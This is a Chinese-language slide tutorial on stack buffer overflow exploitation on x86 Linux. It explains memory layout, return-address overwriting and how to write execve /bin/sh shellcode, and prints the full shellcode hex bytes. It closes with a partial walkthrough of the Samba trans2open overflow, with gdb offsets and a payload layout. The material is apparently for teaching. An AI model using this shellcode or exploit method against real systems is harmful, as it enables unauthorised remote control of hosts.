p2

标题：前言
 
在过去的十年中，以缓冲区溢出为类型的安全漏洞占是最为常见的一种形式了。更为严重的是，缓冲区溢出漏洞占了远程网络攻击的绝大多数，这种攻击可以使得一个匿名的Internet用户有机会获得一台主机的部分或全部的控制权！如果能有效地消除缓冲区溢出的漏洞，则很大一部分的安全威胁可以得到缓解。

p3

缓冲区溢出成为远程攻击的主要手段其原因在于缓冲区溢出漏洞给予了攻击者他所想要的一切：殖入并且执行攻击代码。被殖入的攻击代码以一定的权限运行有缓冲区溢出漏洞的程序，从而得到被攻击主机的控制权。

p4

1998年Lincoln实验室用来评估入侵检测的的5种远程攻击中，有3种是基于社会工程学的信任关系，2种是缓冲区溢出；
1998年CERT的13份建议中，有9份是是与缓冲区溢出有关的；
在Bugtraq的调查中，有2/3的被调查者认为缓冲区溢出漏洞是一个很严重的安全问题。

p5
本次介绍主要试图解释什么是缓冲区溢出, 以及如何利用。
假定使用Intel x86 CPU, 操作系统是Linux。

基本定义：
缓冲区,简单说来是一块连续的计算机内存区域, 可以保存相同数据类型的多个实例。

p6
标题： 进程在内存中的组织形式

C程序员通常和字缓冲区数组打交道。
最常见的是字符数组。数组，与C语言中所有的变量一样，可以被声明为静态或动态 
的。静态变量在程序加载时定位于数据段，动态变量在程序运行时定位于堆栈之中。
溢出，说白了就是灌满，使内容物超过顶端，边缘，或边界。我们这里只关心动态 
缓冲区的溢出问题，即基于堆栈的缓冲区溢出。

p7

进程被分成三个区域: 文本，数据和堆栈。我们把精力集中在堆栈区域，但首先按照顺序简单介绍一下其他区域。

1. 文本区域是由程序确定的，包括代码(指令)和只读数据。该区域相当于可执行文件的文本段。
这个区域通常被标记为只读，任何对其写入的操作都会导致段错误(segmentation violation)。
2. 数据区域包含了已初始化和未初始化的数据。静态变量储存在这个区域中。数据区域对应可执行文件中的heap-bss段。它的大小可以用系统调用brk(2)来改变。如果bss数据的扩展或用户堆栈把可用内存消耗光了，进程就会被阻塞住，等待有了一块更大的内存空间之后再运行. 新内存加入到数据和堆栈段的中间。

p8

/------------\ 内存低地址 
|            |
| 文本       |
|            |
|------------| 
| (已初始化) | -> heap 
| 数据       | 
| (未初始化) | -> bss
|------------| 
|            |
| 堆栈       | -> Stack 
|            | 
\------------/ 内存高地址 


p9

标题：函数调用流程1

堆栈是一块保存数据的连续内存。 一个名为堆栈指针(SP)的寄存器指向堆栈的顶部。堆栈的底部在一个固定的地址。 堆栈的大小在运行时由内核动态地调整。 CPU实现指令PUSH和POP， 向堆栈中添加元素和从中移去元素。 

堆栈由一系列逻辑堆栈帧组成。

堆栈帧：包括函数的参数， 函数地局部变量， 以及恢复前一个堆栈帧所需要的数据， 其中包括在函数调用时指令指针(IP)的值。

除了堆栈指针(SP指向堆栈顶部的的低地址)之外， 为了使用方便还有指向帧内固定地址的指针叫做帧指针(FP)。 

当一个例程被调用时所必须做的第一件事是保存前一个FP(这样当例程退出时就可以恢复)。 然后它把SP复制到FP， 创建新的FP， 把SP向前移动为局部变量保留空间。 这称为例程的序幕(prolog)工作。 当例程退出时， 堆栈必须被清除干净， 这称为例程的收尾(epilog)工作。

example1.c:
------------------------------------------------------------------------------ 
void function(int a, int b, int c) { 
char buffer1[5]; 
char buffer2[10]; 
} 

void main() { 
function(1, 2, 3); 
} 
------------------------------------------------------------------------------ 

对function的调用：
pushl $3
pushl $2 
pushl $1
call function -> 指令call会把指令指针(IP)也压入栈中 称这个地址为RET


程序流程陷入function函数，函数首先进行例程的序幕工作：
pushl %ebp 
movl  %esp, %ebp 
subl  $20, %esp

p10

标题： 函数调用流程2

内存映像
/------------\ 内存低地址 
|            |
| ... ...    |
|            |
|------------| <- esp -----------------
|            |  
| buf2       | 
|            | 
|------------| 
|            | 
| buf1       |          function()堆栈帧 
|            | 
|------------| <- ebp 
| SFP        |
|------------| <- ebp + 4
| RET        |
|------------| 
| $3         |
|------------|
| $2         | 
|------------|
| $1         |    
|------------|        ------------------
| ... ...    |              main()堆栈帧
|            |        ------------------
\------------/ 内存高地址 

p11

标题：数据组织存放问题

example2.c: 
------------------------------------------------------------------------------ 
void function(int a, int b, int c) { 
long    diff;
long    diff2;
char    *ptr;
static buff1[16], buff2[16];
static *ptr2;
char   *buf1=malloc(16);
char   *buf2=malloc(16); 
} 

void main() { 
function(1,2,3); 
} 
------------------------------------------------------------------------------ 

HEAP存放已被初始化的数据，即静态变量；
BSS存放未被初始化的数据；
Stack存放动态局部变量。

内存映像
/------------\ 内存低地址 
|            |
| ... ...    |
|            |
|------------|
|buff1[0..15]|
|------------|
|buff2[0..15]|
|------------|
| ptr2	     |
|------------|
| ... ...    |
|------------|
| buf1[0..15]|
|------------|
| ... ...    | <- 间距8字节，随不同操作系统实现而不同
|------------|
| buf2[0..15]|
|------------|
| ... ...    |
|            |
|------------| <- esp -----------------
| &buf2	     |
|------------|
| &buf1      |
|------------|
| ptr	     |
|------------|
| diff2      | 
|------------| 
| diff1      |          function()堆栈帧 
|------------| <- ebp 
| SFP        |
|------------| <- ebp + 4
| RET        |
|------------| 
| $3         |
|------------|
| $2         | 
|------------|
| $1         |    
|------------|        ------------------
| ... ...    |              main()堆栈帧
|            |        ------------------
\------------/ 内存高地址 


p12

标题： 缓冲区溢出的形成及利用1

缓冲区溢出是向一个缓冲区填充超过它处理能力的数据所造成的结果。如何利用这个经常出现的编程错误来执行任意代码呢？让我们来看看另一个例子: 

example3.c 
------------------------------------------------------------------------------ 
void function(char *str) 
{ 
	char buffer[256]; 
	
	strcpy(buffer,str); 
	printf("hello, %s\n",buffer);
	return;
} 

void main(int argc, char *argvp[]) 
{ 
	if (argc != 2)
	{
		printf("Usage: %s yourname\n", argv[0]);
		return;
	}
	function(argv[1]); 
	printf("OK!\n");
	return;
} 
------------------------------------------------------------------------------ 

执行：./a.out `perl -e "print 'A' x 265`
出现Segmentation fault错误。

内存映像
/------------\ 内存低地址 
|            |
| ... ...    |
|            |
|------------| <- esp -----------------
| buffer[0]  |	
|	     |
|	     |
| ... ...    |
|	     |
|	     |
| buffer[255]|          function()堆栈帧 
|------------| <- ebp 
| SFP        |
|------------| <- ebp + 4
| RET        |
|------------|        ------------------
| ... ...    |              main()堆栈帧
|            |        ------------------
\------------/ 内存高地址 

其中，buffer、SFP、RET都被改写成为0x41414141
当function()函数返回时，程序试图读取返回地址的下一个指令，就从内存地址0x41414141处读取，这个地址已经在进程的地址空间之外了，因此出现了上述的段错误。


p13
标题：缓冲区溢出的形成及利用2

回想上一个例子，覆盖了RET导致段错误，若修改RET为一个没有超过进程地址空间的指令地址，则可以改变程序流程。比如，若希望跳过后面的printf("OK!\n")语句，反汇编main函数得到汇编指令序列：
(gdb) disassemble main
Dump of assembler code for function main:
0x80484c0 <main>:       push   %ebp
0x80484c1 <main+1>:     mov    %esp,%ebp
0x80484c3 <main+3>:     sub    $0x8,%esp
0x80484c6 <main+6>:     cmpl   $0x2,0x8(%ebp)
0x80484ca <main+10>:    je     0x80484e4 <main+36>
0x80484cc <main+12>:    sub    $0x8,%esp
0x80484cf <main+15>:    mov    0xc(%ebp),%eax
0x80484d2 <main+18>:    pushl  (%eax)
0x80484d4 <main+20>:    push   $0x8048583
0x80484d9 <main+25>:    call   0x8048360 <printf>
0x80484de <main+30>:    add    $0x10,%esp
0x80484e1 <main+33>:    jmp    0x8048507 <main+71>
0x80484e3 <main+35>:    nop
0x80484e4 <main+36>:    sub    $0xc,%esp
0x80484e7 <main+39>:    mov    0xc(%ebp),%eax
0x80484ea <main+42>:    add    $0x4,%eax
0x80484ed <main+45>:    pushl  (%eax)
0x80484ef <main+47>:    call   0x8048490 <function>
0x80484f4 <main+52>:    add    $0x10,%esp
0x80484f7 <main+55>:    sub    $0xc,%esp
0x80484fa <main+58>:    push   $0x8048597          <--------"OK!\n"的地址
0x80484ff <main+63>:    call   0x8048360 <printf>  <--------调用printf
0x8048504 <main+68>:    add    $0x10,%esp
0x8048507 <main+71>:    leave                      <--------希望至此直接返回，跳过printf
0x8048508 <main+72>:    ret
End of assembler dump.
只需提供参数如下形式：
A.....A[0x8048507]
其中256+4个A，4字节的0x8048507，即可实现跳过printf("OK!\n")直接结束。
因此，缓冲区溢出的利用主要思路是通过改变函数返回地址RET而改变程序流程去执行我们想要执行的代码。


p14

标题：缓冲区溢出的形成及利用3（shellcode的编写）

现在我们可以修改返回地址即可以改变程序执行的流程，我们想要执行什么程序呢？
在大多数情况下我们只是希望程序派生出一个shell，从这个shell中, 可以执行任何我 
们所希望的命令。一般来说，我们试图破解的程序里并没有这样的代码，因此需要我们把想要执行的代码放到我们想使其溢出的缓冲区里，并且覆盖函数的返回地址，使其指向这个缓冲区。


p15

一、
派生出一个shell的C语言代码：
shellcode.c 
----------------------------------------------------------------------------- 
#include <unistd.h>
void main() { 
char *name[2]; 
name[0] = "/bin/sh"; 
name[1] = NULL; 
execve(name[0], name, NULL); 
} 
------------------------------------------------------------------------------ 
gcc -o shellcode -ggdb -static shellcode.c
通过gdb反汇编__execve调用，观察到底发生了什么：
------------------------------------------------------------------------------ 
0x80002bc <__execve>: pushl %ebp 
0x80002bd <__execve+1>: movl %esp,%ebp 
0x80002bf <__execve+3>: pushl %ebx        例程的准备工作
0x80002c0 <__execve+4>: movl $0xb,%eax    把0xb(十进制的11)放入寄存器EAX中，0xb是系统调用表的索引，11就是execve 
0x80002c5 <__execve+9>: movl 0x8(%ebp),%ebx 把"/bin/sh"的地址放到寄存器EBX中
0x80002c8 <__execve+12>: movl 0xc(%ebp),%ecx 把name[]的地址放到寄存器ECX中
0x80002cb <__execve+15>: movl 0x10(%ebp),%edx 把空指针的地址放到寄存器EDX中
0x80002ce <__execve+18>: int $0x80           进入内核模式
------------------------------------------------------------------------------

由此，所作事情如下：
a) 把以NULL结尾的字串"/bin/sh"放到内存某处； 
b) 把字串"/bin/sh"的地址放到内存某处，后面跟一个空的长字(null long word)；
c) 把0xb放到寄存器EAX中；
d) 把字串"/bin/sh"的地址放到寄存器EBX中；
e) 把字串"/bin/sh"地址的地址放到寄存器ECX中；
f) 把空长字的地址放到寄存器EDX中；
g) 执行指令int $0x80。

二、
但是如果execve()调用由于某种原因失败了怎么办？程序会继续从堆栈中读取指令，这时的堆栈中可能含有随机的数据，程序执行这样的指令十有八九会core dump。如果execve调用失败我们还是希望程序能够干净地退出。为此必须在调用execve之后加入一个exit系统调用。
exit.c 
------------------------------------------------------------------------------ 
#include <unistd.h>
void main() { 
exit(0); 
} 
------------------------------------------------------------------------------ 
gcc -o exit -static exit.c
通过gdb反汇编_exit调用，观察到底发生了什么：
------------------------------------------------------------------------------ 
0x800034c <_exit>: pushl %ebp 
0x800034d <_exit+1>: movl %esp,%ebp 
0x800034f <_exit+3>: pushl %ebx 
0x8000350 <_exit+4>: movl $0x1,%eax  0x1放到寄存器EAX，0x1是系统调用表的索引，就是exit
0x8000355 <_exit+9>: movl 0x8(%ebp),%ebx 放置退出码，返回0, 以表示没有错误
0x8000358 <_exit+12>: int $0x80 
0x800035a <_exit+14>: movl 0xfffffffc(%ebp),%ebx 
0x800035d <_exit+17>: movl %ebp,%esp 
0x800035f <_exit+19>: popl %ebp 
0x8000360 <_exit+20>: ret 
0x8000361 <_exit+21>: nop 
0x8000362 <_exit+22>: nop 
0x8000363 <_exit+23>: nop 
------------------------------------------------------------------------------

三、
编写shellcode，具体动作如下：
a) 把以NULL结尾的字串"/bin/sh"放到内存某处； 
b) 把字串"/bin/sh"的地址放到内存某处，后面跟一个空的长字(null long word)；
c) 把0xb放到寄存器EAX中；
d) 把字串"/bin/sh"的地址放到寄存器EBX中；
e) 把字串"/bin/sh"地址的地址放到寄存器ECX中；
f) 把空长字的地址放到寄存器EDX中；
g) 执行指令int $0x80；
h) 把0x1放到寄存器EAX中；
i) 把0x0放到寄存器EBX中；
j) 执行指令int $0x80。

以汇编代码把上述动作写出：
------------------------------------------------------------------------------ 
movl string_addr,string_addr_addr 
movb $0x0,null_byte_addr 
movl $0x0,null_addr 
movl $0xb,%eax 
movl string_addr,%ebx 
leal string_addr,%ecx 
leal null_string,%edx 
int $0x80 
movl $0x1, %eax 
movl $0x0, %ebx 
int $0x80 
/bin/sh string goes here. 
------------------------------------------------------------------------------ 
问题：们不知道在要破解的程序的内存空间中，上述代码(和其后的字串)会被放到 
哪里，因此“/bin/sh”的地址并不知道，采用相对寻址方法修正上述代码：
------------------------------------------------------------------------------ 
jmp offset-to-call # 2 bytes 计算得出offset-to-call = 0x2a
popl %esi # 1 byte 
movl %esi,array-offset(%esi) # 3 bytes 
movb $0x0,nullbyteoffset(%esi)# 4 bytes 
movl $0x0,null-offset(%esi) # 7 bytes 
movl $0xb,%eax # 5 bytes 
movl %esi,%ebx # 2 bytes 
leal array-offset(%esi),%ecx # 3 bytes 
leal null-offset(%esi),%edx # 3 bytes 
int $0x80 # 2 bytes 
movl $0x1, %eax # 5 bytes 
movl $0x0, %ebx # 5 bytes 
int $0x80 # 2 bytes 
call offset-to-popl # 5 bytes 计算得出offset-to-popl = -0x2f
/bin/sh string goes here. 
------------------------------------------------------------------------------ 
最终得出代码：
shellcodeasm.c 
------------------------------------------------------------------------------ 
void main() { 
__asm__(" 
jmp 0x2a # 2 bytes 
popl %esi # 1 byte 
movl %esi,0x8(%esi) # 3 bytes 
movb $0x0,0x7(%esi) # 4 bytes 
movl $0x0,0xc(%esi) # 7 bytes 
movl $0xb,%eax # 5 bytes 
movl %esi,%ebx # 2 bytes 
leal 0x8(%esi),%ecx # 3 bytes 
leal 0xc(%esi),%edx # 3 bytes 
int $0x80 # 2 bytes 
movl $0x1, %eax # 5 bytes 
movl $0x0, %ebx # 5 bytes 
int $0x80 # 2 bytes 
call -0x2f # 5 bytes 
.string \"/bin/sh\" # 8 bytes 
"); 
} 
------------------------------------------------------------------------------
编译后反汇编得到二进制代码。这就是shellcode：
char shellcode[] = 
"\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00" 
"\x00\xb8\x0b\x00\x00\x00\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80" 
"\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xd1\xff\xff" 
"\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec\x5d\xc3"; 

p16

标题：缓冲区溢出的形成及利用4

回到example3.c：
------------------------------------------------------------------------------ 
void function(char *str) 
{ 
	char buffer[256]; 
	
	strcpy(buffer,str); 
	printf("hello, %s\n",buffer);
	return;
} 

void main(int argc, char *argvp[]) 
{ 
	if (argc != 2)
	{
		printf("Usage: %s yourname\n", argv[0]);
		return;
	}
	function(argv[1]); 
	printf("OK!\n");
	return;
} 
------------------------------------------------------------------------------ 


我们想把要执行的代码放到我们想使其溢出的缓冲区里，并且覆盖函数的返回地址，使其指向这个缓冲区，如此一来，我们构造的参数应该是这样的：

NOP NOP ... NOP Shellcode ADDR ADDR

被覆盖后的堆栈（strcpy后）应该是这样的：

/------------\ 内存低地址 
|            |
| ... ...    |
|            |
|------------| <- esp -----------------
| buffer[0]  |                         	NOP
|	     |				NOP
| 	     |				...
| ... ...    |				NOP
|	     |				Shellcode
|	     |
| buffer[255]|          function()堆栈帧 
|------------| <- ebp ----------------- 
| SFP        |                          ADDR
|------------| <- ebp + 4				
| RET        |                          ADDR 
|------------|        ------------------
| ... ...    |              main()堆栈帧
|            |        ------------------
\------------/ 内存高地址 

ADDR指向前面的NOP某处或者恰好在Shellcode上。


p17
标题：缓冲区溢出实例

Samba Trans2open缓冲区溢出漏洞


一、漏洞描述：
Samba < 2.2.8版本存在缓冲区溢出漏洞，具体如下：

smb.h
--------------------------------------------------------------------------------
#define PSTRING_LEN 1024
typedef char pstring[PSTRING_LEN];
--------------------------------------------------------------------------------

trans2.c
--------------------------------------------------------------------------------
static int call_trans2open(connection_struct *conn, char *inbuf, char *outbuf,
                           int bufsize,
                           char **pparams, char **ppdata)
{
……
char *pname = &params[28];
int16 namelen = strlen(pname)+1;

pstring fname; 
……
StrnCpy(fname,pname,namelen);//未严格检查字符串长度，导致溢出
……
}
--------------------------------------------------------------------------------

util_str.c
--------------------------------------------------------------------------------
char *StrnCpy(char *dest,const char *src,size_t n)
{
  char *d = dest;
  if (!dest) return(NULL);
  if (!src) {
    *dest = 0;
    return(dest);
  }
  while (n-- && (*d++ = *src++)) ;
  *d = 0;
  return(dest);
}
--------------------------------------------------------------------------------

trans2.c
--------------------------------------------------------------------------------
int reply_trans2(connection_struct *conn,
                 char *inbuf,char *outbuf,int length,int bufsize)
--------------------------------------------------------------------------------
pname为客户端输入的数据包结构的一部分，只要该部分长度大于1024字节，即可造成缓冲区溢出。


二、定位RET与数据构造：
1.跟踪程序至StrnCpy函数内：
  a.客户端程序使用gdb调入，在向目标服务器发送trans2open数据报处设置中断：
  (gdb) b 282
  Breakpoint 1 at 0x8048e3a: file trans2root.c, line 282.

  b.运行客户端程序：
  (gdb) r 127.0.0.1 0xbffff714
  Starting program: /home/zzg/hmm/Linux/test 127.0.0.1 0xbffff714
  Connect! -> dest host...

  Breakpoint 1, trans2_open (sock=5) at trans2root.c:283
  283

  c.查看目标服务器产生的子进程，使用ps –aux命令获得子进程ID；

  d.使用gdb跟踪该子进程：gdb /usr/local/samba/bin/smbd pid

  e.设置断点，由于客户端可控，使用客户端向服务端发送的trans2open数据报将包含大量的0x90(NOP)    ，猜测fname的地址空间在0xbffff000至0xbfffff00之间，设置硬中断：
  (gdb) watch *(unsigned int *)0xbffff600==0x90909090
  Hardware watchpoint 1: *(unsigned int *) 3221222912 == 2425393296
  (gdb) c
  Continuing.
  Hardware watchpoint 1: *(unsigned int *) 3221222912 == 2425393296

  f.客户端继续执行；

  g.由于猜测的地址范围正确，预先设置的硬中断发生，此时服务进程应该在StrnCpy函数中。
  Old value = 0
  New value = 1
  0x08101036 in StrnCpy () at eval.c:41
  41      eval.c: No such file or directory.
        in eval.c
  (gdb)

2.程序陷入StrnCpy时，堆栈情况：
内存映像
/------------\ 内存低地址 
|            |
| ... ...    |<- esp此处，此时在strncpy函数内
|            |
|------------|<- ebp此处
|EBP(*1)     |
|------------|
|RET(*1)     |
|------------|
| *fname     |
|------------|
| *pname     |
|------------|         strncpy()堆栈帧
| namelen    |
|------------|       -------------------
| ... ...    |
|------------|
| fname[0]   |
|------------|
| ... ...    |
|            |
|------------|
| fname[1023]|
|------------|
| ... ...    |
|------------|
| EBP(*2)    |
|------------|
| RET        | 
|------------| 
| *conn      |        call_trans2open()堆栈帧 
|------------| 
| ...其他参数|
|------------|        ------------------
| ... ...    |              上层函数堆栈帧
|            |        ------------------
\------------/ 内存高地址 


(gdb) x/5wx $ebp
0xbffff438: 0xbffff8f8  0x0806b405  0xbffff4e0      0x081c2234
0xbffff448: 0x00000425

0xbffff4e0就是fname的地址，而0xbffff8f8就是上层基栈指针地址，我们需要覆盖的EIP地址即0xbffff8f8 + 4。Fname与EBP之间相差0xbffff8f8 – 0xbffff4e0 = 0x418（1048）字节。

3. 构造溢出数据
NOP ... ... NOP Shellcode RET ... RET RET
|                        |           |
0                        1023        1056 


 